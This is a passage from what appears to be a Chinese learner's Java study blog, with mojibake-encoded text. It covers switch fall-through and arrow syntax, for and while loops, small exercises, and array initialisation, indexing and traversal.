title="caseç©¿é€"></a>caseç©¿é€</h4><p>å‘ç°<code>break</code>ä¼šç»“æŸæ•´ä¸ª<code>switch</code>è¯­å¥ã€‚å¦‚æœæ²¡æœ‰å‘ç°<code>break</code>ï¼Œé‚£ä¹ˆç¨‹åºä¼šæ‰§è¡Œä¸‹ä¸€ä¸ª<code>case</code>çš„è¯­å¥ä½“ï¼Œä¸€ç›´é‡åˆ°<code>break</code>æˆ–å¤§æ‹¬å·ä¸ºæ­¢ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;è¯·è¾“å…¥ä»Šå¤©æ˜¯æ˜ŸæœŸå‡ ï¼š&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">today</span> <span class="hljs-operator">=</span> sc.next();<br><br>        <span class="hljs-keyword">switch</span> (today)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;æ˜ŸæœŸä¸€&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;reganmian&quot;</span>);<br>                <span class="hljs-comment">//break;</span><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;æ˜ŸæœŸäºŒ&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;lanzhoulamian&quot;</span>);<br>                <span class="hljs-comment">//break;</span><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;æ˜ŸæœŸä¸‰&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;zhajiangmian&quot;</span>);<br>                <span class="hljs-comment">//break;</span><br>            <span class="hljs-keyword">default</span>:<br>                System.out.println(<span class="hljs-string">&quot;fangbianmian&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/javalearn23.png" alt="javalearn23"></p><h4 id="switchçš„æ–°ç‰¹æ€§"><a href="#switchçš„æ–°ç‰¹æ€§" class="headerlink" title="switchçš„æ–°ç‰¹æ€§"></a>switchçš„æ–°ç‰¹æ€§</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;è¯·è¾“å…¥ä»Šå¤©æ˜¯æ˜ŸæœŸå‡ ï¼š&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">today</span> <span class="hljs-operator">=</span> sc.next();<br><br>        <span class="hljs-keyword">switch</span> (today)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;æ˜ŸæœŸä¸€&quot;</span> -&gt; &#123;<br>                System.out.println(<span class="hljs-string">&quot;ä»Šå¤©æ˜¯æ˜ŸæœŸä¸€&quot;</span>);<span class="hljs-comment">//å»æ‰å¤§æ‹¬å·ç›´æ¥åˆå¹¶æˆä¸€è¡Œä¹Ÿè¡Œ</span><br>            &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;æ˜ŸæœŸäºŒ&quot;</span> -&gt; &#123;<br>                System.out.println(<span class="hljs-string">&quot;ä»Šå¤©æ˜¯æ˜ŸæœŸäºŒ&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;æ˜ŸæœŸä¸‰&quot;</span> -&gt; &#123;<br><br>                System.out.println(<span class="hljs-string">&quot;ä»Šå¤©æ˜¯æ˜ŸæœŸä¸‰&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">default</span> -&gt; &#123;<br>                System.out.println(<span class="hljs-string">&quot;haha &quot;</span>);<br>            &#125;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="swicthä¸ifçš„åŒºåˆ«"><a href="#swicthä¸ifçš„åŒºåˆ«" class="headerlink" title="swicthä¸ifçš„åŒºåˆ«"></a>swicthä¸ifçš„åŒºåˆ«</h4><ul><li>switchæ›´å¤šçš„å»ä¸€ä¸€åˆ—ä¸¾æœ‰é™ä¸ªæ•°æ®</li><li>ifæ›´å¤šçš„å»è¿›è¡ŒèŒƒå›´åˆ¤æ–­</li></ul><h4 id="caseç©¿é€ä¾‹é¢˜ï¼š"><a href="#caseç©¿é€ä¾‹é¢˜ï¼š" class="headerlink" title="caseç©¿é€ä¾‹é¢˜ï¼š"></a>caseç©¿é€ä¾‹é¢˜ï¼š</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;è¯·è¾“å…¥ä»Šå¤©æ˜¯æ˜ŸæœŸå‡ ï¼š&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">today</span> <span class="hljs-operator">=</span> sc.next();<br><br>        <span class="hljs-keyword">switch</span> (today)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;æ˜ŸæœŸä¸€&quot;</span>:<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;æ˜ŸæœŸäºŒ&quot;</span>:<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;æ˜ŸæœŸä¸‰&quot;</span>:<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;æ˜ŸæœŸå››&quot;</span>:<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;æ˜ŸæœŸäº”&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;å·¥ä½œæ—¥&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;æ˜ŸæœŸå…­&quot;</span>:<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;æ˜ŸæœŸæ—¥&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;ä¼‘æ¯æ—¥&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿå¯ä»¥è¿›ä¸€æ­¥ç®€åŒ–(æˆ‘çš„ç‰ˆæœ¬æœ‰ç‚¹ä½å°±åªæ”¾å›¾äº†)ï¼š</p><p><img src="/img/JAVAlearn31.png" alt="JAVAlearn31"></p><h4 id="å¾ªç¯ç»“æ„"><a href="#å¾ªç¯ç»“æ„" class="headerlink" title="å¾ªç¯ç»“æ„"></a>å¾ªç¯ç»“æ„</h4><ul><li>for</li><li>while</li><li>doâ€¦while</li></ul><p>for:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">10</span>; i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;you should know me&quot;</span>);<br>        &#125;<br><br><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>ç»ƒä¹ ï¼šæ±‚1-100ä¸­æ‰€æœ‰å¶æ•°ä¹‹å’Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-comment">//æ±‚1åˆ°100çš„å¶æ•°å’Œ</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">100</span>; i++)&#123;<br><br>            <span class="hljs-keyword">if</span> (i % <span class="hljs-number">2</span> ==<span class="hljs-number">0</span>)&#123;<br><br>                sum = sum +i;<br><br>            &#125;<br>        &#125;<br>        System.out.println(sum);<br><br>        &#125;<br>    &#125;<br><span class="hljs-comment">//2550</span><br></code></pre></td></tr></table></figure><p>ç»ƒä¹ ï¼šé”®ç›˜å½•å…¥ä¸¤ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºä¸€ä¸ªèŒƒå›´ã€‚ç»Ÿè®¡è¿™ä¸ªèŒƒå›´ä¸­æ—¢èƒ½è¢«ä¸‰æ•´é™¤åˆèƒ½è¢«äº”æ•´é™¤çš„æ•°å­—æœ‰å¯¹å¤šå°‘ä¸ª</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-comment">//æ±‚1åˆ°100çš„å¶æ•°å’Œ</span><br><br>        <span class="hljs-type">int</span> i;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;è¯·è¾“å…¥èŒƒå›´è¾ƒå°çš„æ•°å­—Num1ï¼š&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        System.out.println(<span class="hljs-string">&quot;è¯·è¾“å…¥èŒƒå›´è¾ƒå¤§çš„æ•°å­—Num2ï¼š&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num2</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-keyword">for</span> (i = num1; i &lt;= num2; i++)&#123;<br>            <span class="hljs-keyword">if</span> (i % <span class="hljs-number">3</span> ==<span class="hljs-number">0</span> &amp;&amp; i % <span class="hljs-number">5</span> ==<span class="hljs-number">0</span>)&#123;<br>                sum = sum +<span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;åœ¨&quot;</span> + num1 + <span class="hljs-string">&quot;åˆ°&quot;</span> + num2 + <span class="hljs-string">&quot;è¿™ä¸ªèŒƒå›´ä¸­ï¼Œèƒ½åŒæ—¶è¢«3å’Œ5æ•´é™¤çš„æ•°å­—çš„æ•°é‡ä¸ºï¼š&quot;</span>+sum);<br><br><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>while:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//æ‰“å°1åˆ°100</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (i &lt;= <span class="hljs-number">100</span>) &#123;<br>            System.out.println(i);<br>            i++;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>forå’Œwhileçš„å¯¹æ¯”ï¼š</p><p><img src="/img/javalearn24.png" alt="javalearn24"></p><p>æ¯”å¦‚å¯¹äºè¿™æ®µä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (i &lt;= <span class="hljs-number">10</span>) &#123;<br>            System.out.println(i);<br>            i++;<br><br>        &#125;<br>        System.out.println(i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åè¾“å‡ºçš„æ•°æ®ä¼šæ˜¯<code>11</code></p><p>å½“ç„¶å¯ä»¥å¯¹<code>for</code>è¿›è¡Œå¦‚ä¸‹æ”¹å†™(iæåˆ°å¤–é¢)ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> ( ; i &lt;= <span class="hljs-number">10</span>;i++) &#123;<br>            System.out.println(i);<br>            <br><br>        &#125;<br>        System.out.println(i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/javalearn25.png" alt="javalearn25"></p><p>ç»ƒä¹ ï¼šå¦‚æœæƒ³æŠŠ<code>0.1mm</code>çš„çº¸æŠ˜å æˆ<code>8844430mm</code>ï¼Œæ±‚æŠ˜å çš„æ¬¡æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//æŠŠ`0.1mm`çš„çº¸æŠ˜å æˆ`8844430mm`ï¼Œæ±‚æŠ˜å çš„æ¬¡æ•°</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-type">double</span> <span class="hljs-variable">hight</span> <span class="hljs-operator">=</span> <span class="hljs-number">0.1</span>;<br><br><br>        <span class="hljs-keyword">while</span> (hight &lt;= <span class="hljs-number">8844430</span>)&#123;<br><br>            hight = hight * <span class="hljs-number">2</span>;<br><br>            i = i +<span class="hljs-number">1</span>;<br>        &#125;<br>        System.out.println(i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ¤æ–­å›æ–‡æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java">```<br><br><br><br>P48<br><br>P54:<br><br>### æ•°ç»„<br><br>&gt; æ•°ç»„æŒ‡çš„æ˜¯ä¸€ç§å®¹å™¨ï¼Œå¯ä»¥ç”¨æ¥å­˜å‚¨åŒç§æ•°æ®ç±»å‹çš„å¤šä¸ªå€¼<br><br>![javalearn26](img/javalearn26.png)<br><br><br><br>æ•°ç»„çš„å®šä¹‰<br><br>![javalearn27](img/javalearn27.png)<br><br>æ•°ç»„åˆå§‹åŒ–æ–¹å¼ï¼š<br><br>- é™æ€åˆå§‹åŒ–ï¼š<br><br>![javaleearn29](img/javaleearn29.png)<br><br>æ¯”å¦‚ï¼š<br><br>```java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>        String [] theirname = &#123;<span class="hljs-string">&quot;tom&quot;</span>, <span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-string">&quot;bob&quot;</span>, <span class="hljs-string">&quot;chris&quot;</span>&#125;;<br>        <span class="hljs-type">double</span> [] theirhight = &#123;<span class="hljs-number">111.1</span>, <span class="hljs-number">222.2</span>, <span class="hljs-number">333.3</span>, <span class="hljs-number">444.4</span>&#125;;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚ä½•å°†æ•°ç»„ä¸­çš„æ•°æ®å–å‡ºï¼Ÿå¦‚æœç›´æ¥<code>sout</code>æ•°ç»„åï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>    System.out.println(theirage);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼šå‡ºç°ï¼š</p><p><img src="/img/javalearn32.png" alt="javalearn32"></p><p><img src="/img/javalearn33.png" alt="javalearn33"></p><p><img src="/img/javalearn34.png" alt="javalearn34"></p><p>æ•°ç»„å…ƒç´ è®¿é—®</p><ul><li>æ ¼å¼ï¼šæ•°ç»„å[ç´¢å¼•]</li></ul><p>ç´¢å¼•ï¼š</p><ul><li>ä¹Ÿå«ä¸‹æ ‡ã€è§’æ ‡ã€‚</li><li>ç‰¹ç‚¹ï¼šä»0å¼€å§‹ï¼Œé€ä¸ª+1å¢é•¿ï¼Œè¿ç»­ä¸é—´æ–­ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">array1</span> <span class="hljs-operator">=</span> theirage[<span class="hljs-number">0</span>];<br><br>        System.out.println(array1);<br><br>        System.out.println(theirage[<span class="hljs-number">0</span>]);<br><br>        theirage[<span class="hljs-number">0</span>] = <span class="hljs-number">100</span>;<br><br>        System.out.println(theirage[<span class="hljs-number">0</span>]);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ•°ç»„éå†</p><ul><li>å°†æ•°ç»„ä¸­æ‰€æœ‰çš„å†…å®¹å–å‡ºæ¥ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œä¸€ç³»åˆ—æ“ä½œï¼šæ‰“å°ï¼Œæ±‚å’Œï¼Œåˆ¤æ–­ç­‰</li><li>éå†æŒ‡çš„æ˜¯å–å‡ºæ•°æ®çš„è¿‡ç¨‹ï¼Œä¸è¦å±€é™çš„ç†è§£ä¸ºéå†å°±æ˜¯æ‰“å°</li></ul><p>è·Ÿ<code>python</code>å·®ä¸å¤šï¼Œè¿˜æ˜¯ç”¨<code>for</code>å¾ªç¯è¿›è¡Œéå†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">arraylength</span> <span class="hljs-operator">=</span> theirage.length;<br><br>        System.out.println(arraylength);<br><br>        <span class="hljs-type">int</span> i;<br><br>        <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; arraylength; i++)&#123;<br><br>            System.out.println(theirage[i]);<br><br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“ç„¶<code>idea</code>ä¹Ÿæä¾›äº†å¿«é€Ÿç”Ÿæˆæ•°ç»„çš„æ–¹å¼ï¼Œç›´æ¥<code>æ•°ç»„å.fori</code>å°±ä¼šè‡ªåŠ¨ç”Ÿæˆ<code>for (i=0; i &lt; arraylength; i++)</code>è¿™ä¸œè¥¿</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 